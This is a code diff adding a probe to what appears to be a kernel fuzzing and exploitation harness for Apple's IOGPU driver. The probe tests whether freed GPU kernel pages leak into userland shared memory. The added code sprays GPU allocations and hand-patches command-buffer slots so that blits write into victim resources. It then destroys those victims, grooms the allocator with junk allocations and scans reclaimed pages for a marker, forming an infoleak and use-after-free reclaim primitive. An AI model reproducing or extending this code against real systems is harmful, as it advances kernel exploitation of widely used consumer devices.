@@ -19757,6 +19757,188 @@ static void p_ptleak(void) {
     LOG("[ptl] done (alive)");
 }
 
+// V116: p_shmemleak — do sel12 shmems leak freed GPU pages into userland?
+// p_ptleak proved that freed GPU pages keep our marker content in the
+// kernel allocator (stale-TLB / no scrub on reclaim). v90/v91 showed GPU
+// service pages are not zeroed on redistribution. Hypothesis: IOGPU sel12
+// shmem objects are kernel pages mapped CPU-readable into our process; if
+// they come from the same pool without zeroing, a fresh shmem created right
+// after the ptleak spray can carry our marker qword straight into userland
+// — a direct kernel-page-content infoleak and a reclaim detector. Control
+// runs FIRST without spray: fresh shmems are expected all-zero. Then the
+// ptleak spray block (congestion, marked victims, patched blits, destroy +
+// junk flush — NO deliberate crash), then 3 reclaim waves (+1 s, +5 s).
+// Env: FUZZ_SHMEMLEAK=1. Tag [shl].
+static const uint64_t shl_mk = 0x535445454c454b43ULL;   // ptleak marker qword
+// scan one shmem for the marker + nonzero content; returns marker offset
+// (>= 0) or -1, sets *nzq to the nonzero-qword count.
+static long shl_scan(uint32_t id, uint8_t *va, uint64_t sz, const char *tag,
+                     int idx, int hexnz, long *nzq) {
+    long nz = 0, moff = -1;
+    for (uint64_t o = 0; o + 8 <= sz; o += 8) {
+        uint64_t q = *(uint64_t *)(va + o);
+        if (q == shl_mk && moff < 0) moff = (long)o;
+        if (q) nz++;
+    }
+    *nzq = nz;
+    if (moff >= 0) {
+        LOG("[shl] %s[%d] id %u: *** SHMEM LEAK-BACK *** marker @0x%lx", tag, idx, id, moff);
+        hexdump("shl-hit", va + (moff >= 32 ? moff - 32 : 0), 96);
+    } else if (nz && hexnz) {
+        LOG("[shl] %s[%d] id %u: nonzero qwords %ld/%llu (no marker)", tag, idx, id,
+            nz, sz / 8);
+        hexdump("shl-nz", va, 64);
+    }
+    return moff;
+}
+static void p_shmemleak(void) {
+    LOG("[shl] v116 shmem leak-back: sel12 pages vs ptleak spray");
+    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
+    if (!dev) return;
+    id<MTLCommandQueue> mq = [dev newCommandQueue];
+    uint8_t *devObj = *(uint8_t **)((uint8_t *)(__bridge void *)mq + 392);
+    uint8_t *dref = devObj ? *(uint8_t **)(devObj + 656) : NULL;
+    io_connect_t mconn = dref ? *(uint32_t *)(dref + 0x14) : 0;
+    if (!mconn) {
+        mconn = open_service("IOGPU", 1);
+        LOG("[shl] fallback open_service(IOGPU,1) conn 0x%x", mconn);
+    }
+    LOG("[shl] mconn 0x%x", mconn);
+    if (!mq || !mconn) return;
+    static const uint64_t szs[2] = { 0x1000, 0x4000 };
+    static const char *wtag[3] = { "w0", "w1", "w2" };
+
+    // ---- 1. baseline control WITHOUT spray: 64 fresh shmems must be zero
+    LOG("[shl] baseline control: 64 fresh sel12 shmems, no spray (expect zeros)");
+    {
+        long anynz = 0, anymk = 0, shown = 0;
+        for (int i = 0; i < 64; i++) {
+            uint64_t sz = szs[i & 1];
+            uint64_t ty = (i >> 1) & 1;
+            uint8_t *va = NULL;
+            uint32_t id = gpu_shmem_t(mconn, sz, ty, &va);
+            if (!id || !va) { LOG("[shl] base[%d] sel12 failed id %u", i, id); continue; }
+            long nzq = 0;
+            long m = shl_scan(id, va, sz, "base", i, shown < 3, &nzq);
+            if (m >= 0) { anymk++; shown++; }
+            else if (nzq) { anynz++; if (shown < 3) shown++; }
+        }
+        LOG("[shl] baseline: nonzero-without-marker %ld, MARKER %ld %s", anynz, anymk,
+            anymk ? "*** UNEXPECTED — marker before any spray ***" : "(control ok)");
+    }
+
+    // ---- 2. ptleak spray block (verbatim mechanics, NO deliberate SIGSEGV)
+    LOG("[shl] spray block: cong 8x16MB, 8 victims x 0x100000, marker 0x%llx, fill 0x43",
+        shl_mk);
+    fsync(fileno(stderr));
+    @autoreleasepool {
+        const int nv = 8, vsz = 0x100000;
+        id<MTLBuffer> cgS = [dev newBufferWithLength:0x1000000 options:MTLResourceStorageModeShared];
+        id<MTLBuffer> cgD = [dev newBufferWithLength:0x1000000 options:MTLResourceStorageModeShared];
+        memset([cgS contents], 0x55, 0x1000000);
+        for (int i = 0; i < 8; i++) {
+            id<MTLCommandBuffer> cbx = [mq commandBuffer];
+            id<MTLBlitCommandEncoder> encx = [cbx blitCommandEncoder];
+            [encx copyFromBuffer:cgS sourceOffset:0 toBuffer:cgD destinationOffset:0 size:0x1000000];
+            [encx endEncoding];
+            [cbx commit];
+        }
+        // victims, strictly sequential (each top-of-stack)
+        uint32_t vr[8];
+        uint64_t vg[8];
+        uint8_t *vc[8];
+        int nvv = 0;
+        for (int v = 0; v < nv; v++) {
+            vr[nvv] = gpu_resource2(mconn, vsz, &vg[nvv], &vc[nvv]);
+            if (!vr[nvv] || !vc[nvv]) break;
+            memset(vc[nvv], 0, vsz);
+            LOG("[shl] victim[%d] rid %u gpuva 0x%llx", v, vr[nvv], vg[nvv]);
+            nvv++;
+        }
+        // source A: marker page pattern over vsz/0x4000 16KB pages
+        id<MTLBuffer> bufA = [dev newBufferWithLength:vsz options:MTLResourceStorageModeShared];
+        uint8_t *pa = (uint8_t *)[bufA contents];
+        for (int pg = 0; pg < vsz / 0x4000; pg++) {
+            memset(pa + pg * 0x4000, 0x43, 0x4000);
+            *(uint64_t *)(pa + pg * 0x4000) = shl_mk;
+            *(uint64_t *)(pa + pg * 0x4000 + 8) = ((uint64_t)pg << 8);
+        }
+        // NV blits, own bufD each, patched to own victim
+        id<MTLBuffer> bd[8];
+        int nb = 0;
+        uint32_t skb = (uint32_t)(vsz >> 10);
+        for (int v = 0; v < nvv; v++) {
+            bd[nb] = [dev newBufferWithLength:vsz options:MTLResourceStorageModeShared];
+            if (!bd[nb]) break;
+            id<MTLCommandBuffer> cb = [mq commandBuffer];
+            id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
+            [enc copyFromBuffer:bufA sourceOffset:0 toBuffer:bd[nb] destinationOffset:0 size:vsz];
+            [enc endEncoding];
+            uint64_t gpuD = [bd[nb] gpuAddress];
+            long np;
+            if (nb == 0) {
+                gscan_patch(gpuD, gpuD);          // cache build, no-op write
+                np = gscan_patch(gpuD, vg[v]);
+            } else {
+                np = gscan_patch(gpuD, vg[v]);
+                if (!np) { gscan_patch(gpuD, gpuD); np = gscan_patch(gpuD, vg[v]); }
+            }
+            void *storage = find_ivar_obj(cb, "torage", 0, "cb");
+            uint64_t sva = storage ? *(uint64_t *)((uint8_t *)storage + 0x68) : 0;
+            int ridp = 0;
+            if (sva) {
+                uint8_t *sg = (uint8_t *)(uintptr_t)sva;
+                for (long o = 0x48; o + 0x40 <= 0x400; o += 0x40) {
+                    if (*(uint16_t *)(sg + o + 0x3e) == 2 &&
+                        *(uint32_t *)(sg + o + 0x18) == skb && *(uint32_t *)(sg + o + 0x1c) == skb) {
+                        *(uint32_t *)(sg + o + 0x04) = vr[v];
+                        ridp = 1;
+                    }
+                }
+            }
+            [cb commit];
+            LOG("[shl] blit[%d] slots %ld ridp %d", nb, np, ridp);
+            nb++;
+        }
+        // destroy victims + junk flush; keep the wave order: NO reclaim here
+        fsync(fileno(stderr));
+        kern_return_t kd0 = 0;
+        for (int v = 0; v < nvv; v++) {
+            kern_return_t kd = ioconnect_trap1(mconn, 1, vr[v]);
+            if (v == 0) kd0 = kd;
+        }
+        int nj = 0;
+        for (int i = 0; i < 40; i++) {
+            uint64_t gj; uint8_t *pj;
+            uint32_t rj = gpu_resource2(mconn, 0x1000, &gj, &pj);
+            if (rj) { ioconnect_trap1(mconn, 1, rj); nj++; }
+        }
+        LOG("[shl] spray done: nvv %d ncb %d destroy0 kr 0x%08x nj %d", nvv, nb, kd0, nj);
+    }   // autoreleasepool drains cgS/cgD/bufA/bd — pages back to the pool
+
+    // ---- 3. reclaim waves: 128 fresh shmems each, scan for the marker
+    for (int wv = 0; wv < 3; wv++) {
+        if (wv == 1) usleep((useconds_t)1000000);   // +1 s
+        if (wv == 2) usleep((useconds_t)5000000);   // +5 s
+        LOG("[shl] wave %d: 128 fresh sel12 shmems, scanning for marker", wv);
+        long hits = 0, nonz = 0, failed = 0;
+        for (int i = 0; i < 128; i++) {
+            uint64_t sz = szs[i & 1];
+            uint64_t ty = (i >> 1) & 1;
+            uint8_t *va = NULL;
+            uint32_t id = gpu_shmem_t(mconn, sz, ty, &va);
+            if (!id || !va) { failed++; continue; }
+            long nzq = 0;
+            long m = shl_scan(id, va, sz, wtag[wv], i, 0, &nzq);
+            if (m >= 0) hits++;
+            else if (nzq) { nonz++; if (nonz <= 3) hexdump("shl-nz", va, 64); }
+        }
+        LOG("[shl] wave %d done: MARKER HITS %ld, nonzero-no-marker %ld, sel12-failed %ld/128",
+            wv, hits, nonz, failed);
+    }
+    LOG("[shl] done (alive)");
+}
+
 // V110: (A) reclaim UAF pages via IOSurface spray; (B) deep IOSurface fuzz
 // (sel9 manual IOCFSerialize binary blobs, sel27 bulk-attachment frames).
 #include <IOKit/IOCFSerialize.h>
@@ -20045,6 +20227,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_DEGENSURF")) { p_degensurf(); LOG("[probe13] degensurf-only mode, stop"); return NULL; }
         if (getenv("FUZZ_S27DOWN")) { p_s27down(); LOG("[probe13] s27down-only mode, stop"); return NULL; }
         if (getenv("FUZZ_PTLEAK")) { p_ptleak(); LOG("[probe13] ptleak-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_SHMEMLEAK")) { p_shmemleak(); LOG("[probe13] shmemleak-only mode, stop"); return NULL; }
         if (getenv("FUZZ_UAT")) { p_uat(); LOG("[probe13] uat-only mode, stop"); return NULL; }
         if (getenv("FUZZ_UATREC")) { p_uatrec(); LOG("[probe13] uatrec-only mode, stop"); return NULL; }
         if (getenv("FUZZ_RECLAIM2")) { p_reclaim2(); LOG("[probe13] reclaim2-only mode, stop"); return NULL; }
